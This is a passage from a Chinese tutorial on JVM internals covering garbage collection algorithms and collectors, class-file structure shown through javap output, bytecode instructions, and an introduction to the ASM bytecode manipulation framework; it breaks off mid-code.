弱引用\n\n只被弱引用关联的对象只能存活到下一次GC到来前。可以使用`WeakReference`类来实现弱引用。\n\n##### 虚引用\n\n相当于没有引用，也没有办法通过这种引用得到关联的对象，为一个对象设置虚引用的唯一目的就是为了能在对象被回收时收到通知。可以使用`PhantomReference`类来实现虚引用。\n\n#### 垃圾收集算法\n\n##### 分代收集理论\n\n实际上，如果我们对堆中的每一个对象都依次判断是否需要回收，这样的效率其实是很低的，那么有没有更好地回收机制呢？第一步，我们可以对堆中的对象进行分代管理。\n\n比如某些对象，在多次垃圾回收时，都未被判定为可回收对象，我们完全可以将这一部分对象放在一起，并让垃圾收集器减少回收此区域对象的频率，这样就能很好地提高垃圾回收的效率了。\n\n因此，Java虚拟机将堆内存划分为**新生代**、**老年代**和**永久代**（其中永久代是HotSpot虚拟机特有的概念，在JDK8之前方法区实际上就是采用的永久代作为实现，而在JDK8之后，方法区由元空间实现，并且使用的是本地内存，容量大小取决于物理机实际大小，之后会详细介绍）这里我们主要讨论的是**新生代**和**老年代**。\n\n不同的分代内存回收机制也存在一些不同之处，在HotSpot虚拟机中，新生代被划分为三块，一块较大的Eden空间和两块较小的Survivor空间，默认比例为8：1：1，老年代的GC评率相对较低，永久代一般存放类信息等（其实就是方法区的实现）如图所示：\n\n![image-20220222151708141](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbaa6eg9j217a0ggta0.jpg)\n\n那么它是如何运作的呢？\n\n首先，所有新创建的对象，在一开始都会进入到新生代的Eden区（如果是大对象会被直接丢进老年代），在进行新生代区域的垃圾回收时，首先会对所有新生代区域的对象进行扫描，并回收那些不再使用对象：\n\n![image-20220222153104582](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyo48r0j21i20cqq4l.jpg)\n\n接着，在一次垃圾回收之后，Eden区域没有被回收的对象，会进入到Survivor区。在一开始From和To都是空的，而GC之后，所有Eden区域存活的对象都会直接被放入到From区，最后From和To会发生一次交换，也就是说目前存放我们对象的From区，变为To区，而To区变为From区：\n\n![image-20220222154032674](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyn34yfj21gk0d4gn5.jpg)\n\n接着就是下一次垃圾回收了，操作与上面是一样的，不过这时由于我们From区域中已经存在对象了，所以，在Eden区的存活对象复制到From区之后，所有To区域中的对象会进行年龄判定（每经历一轮GC年龄`+1`，如果对象的年龄大于`默认值为15`，那么会直接进入到老年代，否则移动到From区）\n\n![image-20220222154828416](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmc6v1nzcj21h60d2q4l.jpg)\n\n最后像上面一样交换To区和From区，之后不断重复以上步骤。\n\n而垃圾收集也分为：\n\n* Minor GC   -   次要垃圾回收，主要进行新生代区域的垃圾收集。\n\n  * 触发条件：新生代的Eden区容量已满时。\n\n* Major GC   -   主要垃圾回收，主要进行老年代的垃圾收集。\n\n* Full GC      -    完全垃圾回收，对整个Java堆内存和方法区进行垃圾回收。\n\n  * 触发条件1：每次晋升到老年代的对象平均大小大于老年代剩余空间\n  * 触发条件2：Minor GC后存活的对象超过了老年代剩余空间\n  * 触发条件3：永久代内存不足（JDK8之前）\n  * 触发条件4：手动调用`System.gc()`方法\n\n  ![image-20220222205605690](https://tva1.sinaimg.cn/large/e6c9d24ely1gzml30209wj21u80ren3q.jpg)\n\n##### 标记-清除算法\n\n前面我们已经了解了整个堆内存实际上是以分代收集机制为主，但是依然没有讲到具体的收集过程，那么，具体的回收过程又是什么样的呢？首先我们来了解一下最古老的`标记-清除`算法。\n\n首先标记出所有需要回收的对象，然后再依次回收掉被标记的对象，或是标记出所有不需要回收的对象，只回收未标记的对象。实际上这种算法是非常基础的，并且最易于理解的（这里对象我就以一个方框代替了，当然实际上存放是我们前说到的GC Roots形式）\n\n![image-20220222165709034](https://tva1.sinaimg.cn/large/e6c9d24egy1gzme6btluwj21e40c0760.jpg)\n\n虽然此方法非常简单，但是缺点也是非常明显的 ，首先如果内存中存在大量的对象，那么可能就会存在大量的标记，并且大规模进行清除。并且一次标记清除之后，连续的内存空间可能会出现许许多多的空隙，碎片化会导致连续内存空间利用率降低。\n\n##### 标记-复制算法\n\n既然标记清除算法在面对大量对象时效率低，那么我们可以采用标记-复制算法。它将容量分为同样大小的两块区域，\n\n标记复制算法，实际上就是将内存区域划分为大小相同的两块区域，每次只使用其中的一块区域，每次垃圾回收结束后，将所有存活的对象全部复制到另一块区域中，并一次性清空当前区域。虽然浪费了一些时间进行复制操作，但是这样能够很好地解决对象大面积回收后空间碎片化严重的问题。\n\n![image-20220222210942507](https://tva1.sinaimg.cn/large/e6c9d24ely1gzmlh5aveqj21ti0u079c.jpg)\n\n这种算法就非常适用于新生代（因为新生代的回收效率极高，一般不会留下太多的对象）的垃圾回收，而我们之前所说的新生代Survivor区其实就是这个思路，包括8:1:1的比例也正是为了对标记复制算法进行优化而采取的。\n\n##### 标记-整理算法\n\n虽然标记-复制算法能够很好地应对新生代高回收率的场景，但是放到老年代，它就显得很鸡肋了。我们知道，一般长期都回收不到的对象，才有机会进入到老年代，所以老年代一般都是些钉子户，可能一次GC后，仍然存留很多对象。而标记复制算法会在GC后完整复制整个区域内容，并且会折损50%的区域，显然这并不适用于老年代。\n\n那么我们能否这样，在标记所有待回收对象之后，不急着去进行回收操作，而是将所有待回收的对象整齐排列在一段内存空间中，而需要回收的对象全部往后丢，这样，前半部分的所有对象都是无需进行回收的，而后半部分直接一次性清除即可。\n\n![image-20220222213208681](https://tva1.sinaimg.cn/large/e6c9d24ely1gzmm4g8voxj21vm08ywhj.jpg)\n\n虽然这样能保证内存空间充分使用，并且也没有标记复制算法那么繁杂，但是缺点也是显而易见的，它的效率比前两者都低。甚至，由于需要修改对象在内存中的位置，此时程序必须要暂停才可以，在极端情况下，可能会导致整个程序发生停顿（被称为“Stop The World”）。\n\n所以，我们可以将标记清除算法和标记整理算法混合使用，在内存空间还不是很凌乱的时候，采用标记清除算法其实是没有多大问题的，当内存空间凌乱到一定程度后，我们可以进行一次标记整理算法。\n\n#### 各种垃圾收集器 (只讲部分具有代表性的)\n\n##### Serial\n\n这款垃圾收集器也是元老级别的收集器了，在JDK1.3.1之前，是虚拟机新生代区域收集器的唯一选择。这是一款单线程的垃圾收集器，也就是说，当开始进行垃圾回收时，需要暂停所有的线程，直到垃圾收集工作结束。它的新生代收集算法采用的是标记复制算法，老年代采用的是标记整理算法。\n\n![image-20220223104605648](https://tva1.sinaimg.cn/large/e6c9d24ely1gzn92k8ooej21ae0bc75m.jpg)\n\n可以看到，当进入到垃圾回收阶段时，所有的用户线程必须等待GC线程完成工作，就相当于你打一把游戏，中途每隔1分钟网络就卡5秒钟，这确实让人难以接受。\n\n虽然缺点很明显，但是优势也是显而易见的：\n\n1. 设计简单而高效。\n2. 在用户的桌面应用场景中，内存一般不大，可以在较短时间内完成垃圾收集，只要不频繁发生，使用串行回收器是可以接受的。\n\n##### ParNew\n\n这款垃圾收集器相当于是Serial收集器的多线程版本，它能够支持多线程垃圾收集：\n\n![image-20220223111344962](https://tva1.sinaimg.cn/large/e6c9d24ely1gzn9vbvb0mj21c20c00uc.jpg)\n\n除了多线程支持以外，其他内容基本与Serial收集器一致，并且目前某些JVM默认的服务端模式新生代收集器就是使用的ParNew收集器。\n\n##### CMS\n\n在JDK1.5，HotSpot推出了一款在强交互应用中几乎可认为有划时代意义的垃圾收集器：CMS（Concurrent-Mark-Sweep）收集器，这款收集器是HotSpot虚拟机中第一款真正意义上的并发（注意这里的并发和之前的并行是有区别的，并发可以理解为同时运行用户线程和GC线程，而并行可以理解为多条GC线程同时工作）收集器，它第一次实现了让垃圾收集线程与用户线程同时工作。\n\n它主要采用标记清除算法：\n\n![image-20220223114019381](https://tva1.sinaimg.cn/large/e6c9d24ely1gznamys2bdj21as0co404.jpg)\n\n它的垃圾回收分为4个阶段：\n\n* 初始标记（需要暂停用户线程）：这个阶段的主要任务仅仅只是标记出GC Roots能直接关联到的对象，速度比较快，不用担心会停顿太长时间。\n* 并发标记：从GC Roots的直接关联对象开始遍历整个对象图的过程，这个过程耗时较长但是不需要停顿用户线程，可以与垃圾收集线程一起并发运行。\n* 重新标记（需要暂停用户线程）：由于并发标记阶段可能某些用户线程会导致标记产生变得，因此这里需要再次暂停所有线程进行并行标记，这个时间会比初始标记时间长一丢丢。\n* 并发清除：最后就可以直接将所有标记好的无用对象进行删除，因为这些对象程序中也用不到了，所以可以与用户线程并发运行。\n\n虽然它的优点非常之大，但是缺点也是显而易见的，我们之前说过，标记清除算法会产生大量的内存碎片，导致可用连续空间逐渐变少，长期这样下来，会有更高的概率触发Full GC，并且在与用户线程并发执行的情况下，也会占用一部分的系统资源，导致用户线程的运行速度一定程度上减慢。\n\n不过，如果你希望的是最低的GC停顿时间，这款垃圾收集器无疑是最佳选择，不过自从G1收集器问世之后，CMS收集器不再推荐使用了。\n\n##### Garbage First (JDK9+)\n\n此垃圾收集器也是一款划时代的垃圾收集器，在JDK7的时候正式走上历史舞台，它是一款主要面向于服务端的垃圾收集器，并且在JDK9时，取代了JDK8默认的 Parallel Scavenge + Parallel Old 的回收方案。\n\n我们知道，我们的垃圾回收分为`Minor GC`、`Major GC `和`Full GC`，它们分别对应的是新生代，老年代和整个堆内存的垃圾回收，而G1收集器巧妙地绕过了这些约定，它将整个Java堆划分成`2048`个大小相同的独立`Region`块，每个`Region块`的大小根据堆空间的实际大小而定，整体被控制在1MB到32MB之间，且都为2的N次幂。所有的`Region`大小相同，且在JVM的整个生命周期内不会发生改变。\n\n那么分出这些`Region`有什么意义呢？每一个`Region`都可以根据需要，自由决定扮演哪个角色（Eden、Survivor和老年代），收集器会根据对应的角色采用不同的回收策略。此外，G1收集器还存在一个Humongous区域，它专门用于存放大对象（一般认为大小超过了Region容量一半的对象为大对象）这样，新生代、老年代在物理上，不再是一个连续的内存区域，而是到处分布的。\n\n![image-20220223123636582](https://tva1.sinaimg.cn/large/e6c9d24ely1gznc9jvdzdj21f40eiq4g.jpg)\n\n它的回收过程与CMS大体类似：\n\n![image-20220223123557871](https://tva1.sinaimg.cn/large/e6c9d24ely1gznc8vqqqij21h00emwgt.jpg)\n\n分为以下四个步骤：\n\n* 初始标记（暂停用户线程）：仅仅只是标记一下GC Roots能直接关联到的对象，并且修改TAMS指针的值，让下一阶段用户线程并发运行时，能正确地在可用的Region中分配新对象。这个阶段需要停顿线程，但耗时很短，而且是借用进行Minor GC的时候同步完成的，所以G1收集器在这个阶段实际并没有额外的停顿。\n* 并发标记：从GC Root开始对堆中对象进行可达性分析，递归扫描整个堆里的对象图，找出要回收的对象，这阶段耗时较长，但可与用户程序并发执行。\n* 最终标记（暂停用户线程）：对用户线程做一个短暂的暂停，用于处理并发标记阶段漏标的那部分对象。\n* 筛选回收：负责更新Region的统计数据，对各个Region的回收价值和成本进行排序，根据用户所期望的停顿时间来制定回收计划，可以自由选择任意多个Region构成回收集，然后把决定回收的那一部分Region的存活对象复制到空的Region中，再清理掉整个旧Region的全部空间。这里的操作涉及存活对象的移动，是必须暂停用户线程，由多个收集器线程并行完成的。\n\n##### Shenandoah & ZGC (低延迟)\n\n专为低延迟场景特化的垃圾收集器，论综合表现可能比不上G1，但他们暂停线程的时间比G1还要短得多。适合一些对GC延迟有特殊要求的特殊场景。具体不想介绍了，有兴趣可以课下了解，他们的几乎整个工作过程都是并发的，工作原理蛮有意思的。\n\n## 字节码\n\n终于写到这里了，我最想讲的就是这个，这个也最好玩:D\n\n### 什么是字节码\n\n众所周知，Java是一门跨平台语言，只要能跑JVM的平台都能运行同一份Jar包。而Jar包其实本质上就是一堆class文件和一些资源文件打包放到一个压缩包里罢了，我们也可以直接运行class文件。那么class文件里面有什么内容呢？肯定不可能是机器码吧，如果是机器码要怎么跨平台？答案就是字节码。Kotlin之所以兼容Java，也是因为它是把kt文件编译成字节码，而Java和Kotlin之间的相互调用其实就是字节码之间的调用。JVM内置字节码解释器，在运行时动态解释字节码文件，把字节码翻译成对应平台的机器码运行。\n\n### 类文件的基础结构\n\nClass文件是一组以8个字节为基础单位的二进制流，当遇到需要占用8个字节以上空间的数据项时，则会按照高位在前的方式分割成若干个8个字节进行存储。Class文件使用一种类似于C语言结构体的伪结构来存储数据，这种伪结构中只有两种数据类型: **无符号数**, **表**。后面的解析都以这两种数据类型为基础。\n\n我们先来看一段示例代码\n\n~~~java\npublic class TestClazz {\n    public static void main(String[] args) {\n        int a = 1;\n        int b = 2 + a;\n        System.out.println(sum(a, b));\n    }\n\n    private static int sum(int a, int b) {\n        System.out.println(\"execute sum function.\");\n        return a + b;\n    }\n}\n~~~\n\n我们用`javap -verbose` 指令将它编译并解码为我们肉眼可以观测的字节码\n\n~~~\nClassfile /D:/project/android/ksp-learn/test/build/classes/java/main/kim/bifrost/rain/ksp/TestClazz.class\n  Last modified 2022-7-9; size 754 bytes\n  MD5 checksum 2b38afaa297c7960c988943b0c475282\n  Compiled from \"TestClazz.java\"\npublic class kim.bifrost.rain.ksp.TestClazz\n  minor version: 0\n  major version: 52\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #1 = Methodref          #8.#27         // java/lang/Object.\"<init>\":()V\n   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;\n   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I\n   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V\n   #5 = String             #33            // execute sum function.\n   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V\n   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz\n   #8 = Class              #36            // java/lang/Object\n   #9 = Utf8               <init>\n  #10 = Utf8               ()V\n  #11 = Utf8               Code\n  #12 = Utf8               LineNumberTable\n  #13 = Utf8               LocalVariableTable\n  #14 = Utf8               this\n  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;\n  #16 = Utf8               main\n  #17 = Utf8               ([Ljava/lang/String;)V\n  #18 = Utf8               args\n  #19 = Utf8               [Ljava/lang/String;\n  #20 = Utf8               a\n  #21 = Utf8               I\n  #22 = Utf8               b\n  #23 = Utf8               sum\n  #24 = Utf8               (II)I\n  #25 = Utf8               SourceFile\n  #26 = Utf8               TestClazz.java\n  #27 = NameAndType        #9:#10         // \"<init>\":()V\n  #28 = Class              #37            // java/lang/System\n  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;\n  #30 = NameAndType        #23:#24        // sum:(II)I\n  #31 = Class              #40            // java/io/PrintStream\n  #32 = NameAndType        #41:#42        // println:(I)V\n  #33 = Utf8               execute sum function.\n  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V\n  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz\n  #36 = Utf8               java/lang/Object\n  #37 = Utf8               java/lang/System\n  #38 = Utf8               out\n  #39 = Utf8               Ljava/io/PrintStream;\n  #40 = Utf8               java/io/PrintStream\n  #41 = Utf8               println\n  #42 = Utf8               (I)V\n  #43 = Utf8               (Ljava/lang/String;)V\n{\n  public kim.bifrost.rain.ksp.TestClazz();\n    descriptor: ()V\n    flags: ACC_PUBLIC\n    Code:\n      stack=1, locals=1, args_size=1\n         0: aload_0\n         1: invokespecial #1                  // Method java/lang/Object.\"<init>\":()V\n         4: return\n      LineNumberTable:\n        line 10: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       5     0  this   Lkim/bifrost/rain/ksp/TestClazz;\n\n  public static void main(java.lang.String[]);\n    descriptor: ([Ljava/lang/String;)V\n    flags: ACC_PUBLIC, ACC_STATIC\n    Code:\n      stack=3, locals=3, args_size=1\n         0: iconst_1\n         1: istore_1\n         2: iconst_2\n         3: iload_1\n         4: iadd\n         5: istore_2\n         6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n         9: iload_1\n        10: iload_2\n        11: invokestatic  #3                  // Method sum:(II)I\n        14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n        17: return\n      LineNumberTable:\n        line 12: 0\n        line 13: 2\n        line 14: 6\n        line 15: 17\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      18     0  args   [Ljava/lang/String;\n            2      16     1     a   I\n            6      12     2     b   I\n}\nSourceFile: \"TestClazz.java\"\n~~~\n\n#### 魔数 & Class文件版本\n\nclass文件的前4个Byte被称为魔数(Magic Number), 这些魔数的意义在于标识class文件。在类的加载阶段会根据这头四个Byte判断是否是合法的class文件。魔数的选取也颇有历史渊源`0xCAFE BABE`，Java的创始人十分喜欢咖啡:)。\n\n![aZx0S4EjfY](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/aZx0S4EjfY.jpg)\n\n![飞书20220709-173350](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220709-173350.jpg)\n\n随后第四个字节，也就是7列存储着字节码的版本号。这里是34，从16进制翻译过来就是52，对应着Java8的字节码版本。\n\n第5和第6个字节是次版本号（Minor Version）,第7，8个字节是主版本号（Major Version）。Java是版本号是从45开始，JDK1.1之后的每个JDK大版本发布主版本号向上+1，高版本的JDK能向下兼容以前版本的Class文件，而不能运行以后版本的Class文件。\n\n#### 常量池\n\n即\n\n~~~\nConstant pool:\n   #1 = Methodref          #8.#27         // java/lang/Object.\"<init>\":()V\n   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;\n   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I\n   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V\n   #5 = String             #33            // execute sum function.\n   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V\n   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz\n   #8 = Class              #36            // java/lang/Object\n   #9 = Utf8               <init>\n  #10 = Utf8               ()V\n  #11 = Utf8               Code\n  #12 = Utf8               LineNumberTable\n  #13 = Utf8               LocalVariableTable\n  #14 = Utf8               this\n  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;\n  #16 = Utf8               main\n  #17 = Utf8               ([Ljava/lang/String;)V\n  #18 = Utf8               args\n  #19 = Utf8               [Ljava/lang/String;\n  #20 = Utf8               a\n  #21 = Utf8               I\n  #22 = Utf8               b\n  #23 = Utf8               sum\n  #24 = Utf8               (II)I\n  #25 = Utf8               SourceFile\n  #26 = Utf8               TestClazz.java\n  #27 = NameAndType        #9:#10         // \"<init>\":()V\n  #28 = Class              #37            // java/lang/System\n  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;\n  #30 = NameAndType        #23:#24        // sum:(II)I\n  #31 = Class              #40            // java/io/PrintStream\n  #32 = NameAndType        #41:#42        // println:(I)V\n  #33 = Utf8               execute sum function.\n  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V\n  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz\n  #36 = Utf8               java/lang/Object\n  #37 = Utf8               java/lang/System\n  #38 = Utf8               out\n  #39 = Utf8               Ljava/io/PrintStream;\n  #40 = Utf8               java/io/PrintStream\n  #41 = Utf8               println\n  #42 = Utf8               (I)V\n  #43 = Utf8               (Ljava/lang/String;)V\n~~~\n\n紧接着主次版本号之后的是常量池入口，常量池可以比喻为Class文件里的资源仓库，它是Class文件结构中与其他项目关联最多的数据。\n\n首先上来就会有一个1字节的无符号数，它用于表示当前常量的类型（常量类型有很多个）这里只列举一部分的类型介绍：\n\n|           类型            | 标志 |                             描述                             |\n| :-----------------------: | :--: | :----------------------------------------------------------: |\n|    CONSTANT_Utf8_info     |  1   |                    UTF-8编码格式的字符串                     |\n|   CONSTANT_Integer_info   |  3   | 整形字面量（第一章我们演示的很大的数字，实际上就是以字面量存储在常量池中的） |\n|    CONSTANT_Class_info    |  7   |                      类或接口的符号引用                      |\n|   CONSTANT_String_info    |  8   |                      字符串类型的字面量                      |\n|  CONSTANT_Fieldref_info   |  9   |                        字段的符号引用                        |\n|  CONSTANT_Methodref_info  |  10  |                        方法的符号引用                        |\n| CONSTANT_MethodType_info  |  16  |                           方法类型                           |\n| CONSTANT_NameAndType_info |  12  |                   字段或方法的部分符号引用                   |\n\n实际上这些东西，虽然我们不知道符号引用是什么东西，我们可以观察出来，这些东西或多或少都是存放类中一些名称、数据之类的东西。\n\n比如我们来看第一个`CONSTANT_Methodref_info`表中存放了什么数据，这里我只列出它的结构表（详细的结构表可以查阅《深入理解Java虚拟机 第三版》中222页总表）：\n\n|          常量           | 项目  | 类型 |                        描述                         |\n| :---------------------: | :---: | :--: | :-------------------------------------------------: |\n| CONSTANT_Methodref_info |  tag  |  u1  |                       值为10                        |\n|                         | index |  u2  |   指向声明方法的类描述父CONSTANT_Class_info索引项   |\n|                         | index |  u2  | 指向名称及类型描述符CONSTANT_NameAndType_info索引项 |\n\n再看看它指向的`CONSTANT_Class_info`和`CONSTANT_NameAndType_info`的结构\n\n|        常量         | 项目  | 类型 |           描述           |\n| :-----------------: | :---: | :--: | :----------------------: |\n| CONSTANT_Class_info |  tag  |  u1  |          值为7           |\n|                     | index |  u2  | 指向全限定名常量项的索引 |\n\n|           常量            | 项目  | 类型 |               描述               |\n| :-----------------------: | :---: | :--: | :------------------------------: |\n| CONSTANT_NameAndType_info |  tag  |  u1  |              值为12              |\n|                           | index |  u2  |  指向字段或方法名称常量项的索引  |\n|                           | index |  u2  | 指向字段或方法描述符常量项的索引 |\n\n##### 方法标识符\n\n再说一下方法标识符，我们先找到sum方法的NameAndType常量\n\n> #30 = NameAndType        #23:#24        // sum:(II)I\n\n我们会发现这里已经为我们标识出来了，#23对应`sum`，也就是方法名称。#24对应`(II)I`即方法标识符。\n\n那么这个(II)I有什么意思呢，括号内的两个I代表该方法有两个int类型的形参，括号后面的I代表该方法的返回值是int类型。\n\n至于不同类型的修饰符，我贴一个表在下面:\n\n![image-20220223192518999](https://tva1.sinaimg.cn/large/e6c9d24ely1gzno2stssaj216i08mjsr.jpg)\n\n构造器的标识符为`()V`，即一个无形参，返回值为void类型的方法。\n\n再举几个例子:\n\n> public Set<ArathothAttribute> getAttrInstSet()\n>\n> ()Ljava/util/Set<ink/rainbowbridge/v1/arathoth/attribute/abstracts/ArathothAttribute;>;\n>\n> 如你所见，泛型并不会在编译时被擦除，只会在运行时\n>\n> 所以我们可以在运行时通过草字节码的方式获得一个已经被擦除的泛型\n\n> public Double getRandom(Double value1, Double value2)\n>\n> (Ljava/lang/Double;Ljava/lang/Double;)Ljava/lang/Double;\n>\n> 装箱后的基础类型实际上是类\n>\n> 提点题外话\n>\n> public double sum(Double value1, double value2) {\n>\n> ​\t\treturn value1 + value2;\n>\n> }\n>\n> 你们觉得它编译出来字节码会怎么样:), 实际上字节码调用了value1的doubleValue()方法得到了未装箱的值，再进行相加。\n>\n> 反之亦然，java有自动装箱和自动拆箱的特性。\n\n> 那么数组会如何呢\n>\n> public double[] getRandomNums()\n>\n> ()[D\n>\n> 当然是在前面加个[\n\n#### 访问标志\n\n即\n\n~~~\n  flags: ACC_PUBLIC, ACC_SUPER\n~~~\n\n从字面上应该就能猜出这些访问标志的意思，它们用来描述一个类/方法/字段的各种修饰符。\n\n类的标志类型:\n\n![image-20220223200619811](https://tva1.sinaimg.cn/large/e6c9d24ely1gznp9glonej216i0hcjui.jpg)\n\n字段的标志类型:\n\n![image-20220223201053780](https://tva1.sinaimg.cn/large/e6c9d24ely1gznpe7is4wj21620eswh4.jpg)\n\n方法的标志类型:\n\n| 标志名称         | 标志值 | 含义                             |\n| ---------------- | ------ | -------------------------------- |\n| ACC_PUBLIC       | 0x0001 | 方法是否为public                 |\n| ACC_PRIVATE      | 0x0002 | 方法是否为private                |\n| ACC_PROTECTED    | 0x0004 | 方法是否为protected              |\n| ACC_STATIC       | 0x0008 | 方法是否为static                 |\n| ACC_FINAL        | 0x0010 | 方法是否为final                  |\n| ACC_SYNCHRONIZED | 0x0020 | 方法是否为synchronized           |\n| ACC_BRIDGE       | 0x0040 | 方法是不是由编译器产生的桥接方法 |\n| ACC_VARARGS      | 0x0080 | 方法是否接受不定参数             |\n| ACC_NATIVE       | 0x0100 | 方法是否为native                 |\n| ACC_ABSTRACT     | 0x0400 | 方法是否为abstract               |\n| ACC_STRICT       | 0x0800 | 方法是否为strictfp               |\n| ACC_SYNTHETIC    | 0x1000 | 方法是否由编译器自动产生         |\n\n#### 字节码指令\n\n> 我觉得字节码要细讲完全可以再单开一篇讲，这里就稍微讲一点基础的，让待会ASM的时候不至于完全懵逼就行\n\n前面讲了这么多基本都是描述类和方法的信息，大家一定很好奇我们编写的程序逻辑到底放在哪里了吧。没错，我们编写的逻辑被编译成了面向操作**操作数栈**的字节码指令。为什么要说它是面向**操作数栈**的操作指令？接下来我会讲一讲main方法中所有字节码指令的作用，听完你们就知道了。\n\n```java\npublic static void main(String[] args) {\n    int a = 1;\n    int b = 2 + a;\n    System.out.println(sum(a, b));\n}\n```\n\n    Code:\n      stack=3, locals=3, args_size=1\n         0: iconst_1\n         1: istore_1\n         2: iconst_2\n         3: iload_1\n         4: iadd\n         5: istore_2\n         6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n         9: iload_1\n        10: iload_2\n        11: invokestatic  #3                  // Method sum:(II)I\n        14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n        17: return\n\n---\n\n> iconst_1\n\n将一个int类型的常量`1`加载到**操作数栈**, 此时操作数栈深度为1。对应`int a = 1`中1的初始化。\n\n> istore_1\n\n将一个int类型的数值从**操作数栈**顶取出并存储到局部变量表，这个数值在操作数栈的位置为1，即我们刚才压进操作数栈的`1`，对应`int a = 1`中的赋值操作\n\n> iconst_2\n\n将一个int类型的常量`2`加载到**操作数栈**，此时操作数栈深度为2。对应 `int b = 2 + a`中2的初始化\n\n> iload_1\n\n将一个int类型的局部变量直接加载到**操作数栈**，这个局部变量在局部变量表的位置为1。即刚才第二条指令存进局部变量表的局部变量`a`\n\n> iadd\n\n将**操作数栈**顶的两个int类型的数值取出并相加，再压进**操作数栈**中，对应`int b = 2 + a`的加法运算\n\n> istore_2\n\n将一个int类型的数值从**操作数栈**顶中取出并存储到局部变量表，这个数值在**操作数栈**的位置为2，对应`int b = 2 + a`的赋值\n\n> getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n\n获取静态域`System.out`, 类型为`Ljava/io/PrintStream`,并将其压入**操作数栈**顶。后面跟的`#2`在常量池中对应`Field java/lang/System.out:Ljava/io/PrintStream;`\n\n> iload_1\n\n将int类型的局部变量`a`加载到**操作数栈**，待用\n\n> iload_2\n\n将int类型的局部变量b加载到**操作数栈**，待用\n\n> invokestatic  #3                  // Method sum:(II)I\n\n执行所在类中的静态方法，传入栈顶的两个int数值作为形参，返回一个int类型的值压入栈顶\n\n> invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n\n执行`PrintStream#println`方法，传入栈顶元素作为参数，再传入下一个栈顶元素作为receiver（不知道java这个叫什么，反正kotlin有receiver这个概念）\n\n> return\n\n返回void\n\n---\n\n经过上面的分析我们已经大致知道了某些字节码的功能，你肯定也发现了，很大一部分字节码的功能是基于**操作数栈**实现的。\n\n特别是基于栈的数学运算，挺有意思的，我记得我们上学期有一次红岩作业就是实现一个逻辑运算，当时去网上看了一下，要用逆波兰表达式的解析方式配合栈来实现，这应该也是jvm数学运算的实现方式吧，有兴趣可以再写一遍。\n\n这里我就不系统性的讲解字节码指令了，太多了，根本讲不完。但你们可以课下去了解，我一般是遇见不认识的然后再去查:)\n\n### ASM框架\n\n前面我们学习了字节码的基本结构以及部分字节码指令，我们一般使用ASM/Javassist/cglib等字节码操控框架来动态的修改/生成字节码。那么通过它们我们能做到什么事情呢?\n\n- 编译期代码生成/替换 ，一般通过gradle插件干预编译实现（例如著名的gradle插件shadowJar的依赖包重定向(relocate)功能)。字节码插桩也是在这个过程进行。\n- 运行期动态代理，可以做到一些InvocationHandler做不到的事情，例如修改类中包引用的包名。\n- 在获取一些类的信息时，使用asm读取字节码比反射要快得多。\n- 使用jvm一些奇奇怪怪的特性，例如[MeiVinEight/ReflectionFX: Reflection Toolkit (github.com)](https://github.com/MeiVinEight/ReflectionFX)，该项目利用字节码的一些乱七八糟的特性实现了性能开销更小的反射，其性能甚至能够与操作MethodHandle持平。\n\n其实应该还有很多，我就不列举了。\n\n这里可能有人有疑问，我们android不是编译成dex吗，那按照常规的方式操作字节码是可行的吗？答案是可行，因为我们字节码插桩的过程一般是\n\n这里我主要介绍asm框架，它是最流行，最直接的操作字节码的框架，jdk甚至内置了一份。如果从学习字节码的角度来看，asm无疑是最合适的选择。同时安卓中用得比较多的技术就是字节码插桩，所以我准备讲一讲如何用asm框架实现字节码插桩。\n\n#### ASM Core API & Tree API\n\n##### Core API\n\nASM 是基于访问者模式设计的，访问者模式可以让ASM更好的操作某个Jar包/class文件中的所有类/字段/方法。因此要学会ASM，首先必须要了解访问者模式。(我其实懵逼了很久) 如果你们以后有兴趣了解kapt/ksp也会用到访问者模式。（实际上这俩很多时候是跟asm配合着用的, kapt/ksp生成代码，asm对代码进行插桩调用）\n\n[访问者模式 | 菜鸟教程 (runoob.com)](https://www.runoob.com/design-pattern/visitor-pattern.html)\n\n现在我们来讲讲基础用法:\n\nASM基于访问者模式，为我们提供了一套访问class文件中所有属性的API。\n\n```java\npublic abstract class ClassVisitor {\n        ......\n    public void visit(int version, int access, String name, String signature, String superName, String[] interfaces);\n    //访问类字段时回调\n    public FieldVisitor visitField(int access, String name, String desc, String signature, Object value);\n    //访问类方法是回调\n    public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions);\n    public void 